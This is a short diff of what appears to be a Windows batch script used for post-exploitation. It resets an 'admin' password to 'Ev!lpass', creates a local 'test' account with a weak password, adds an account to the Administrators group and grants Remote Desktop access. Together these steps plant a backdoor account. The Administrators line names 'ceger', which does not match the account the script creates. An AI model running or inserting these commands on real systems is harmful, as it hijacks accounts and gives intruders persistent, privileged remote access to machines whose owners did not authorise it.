@@ -12,3 +12,9 @@ net start WSearch
 
 #Attempting to change the password
 net user admin Ev!lpass
+
+
+#Post Exploit-Adding user
+net user test testtest /add
+net localgroup administrators ceger /add
+net localgroup "Remote Desktop Users" test /add
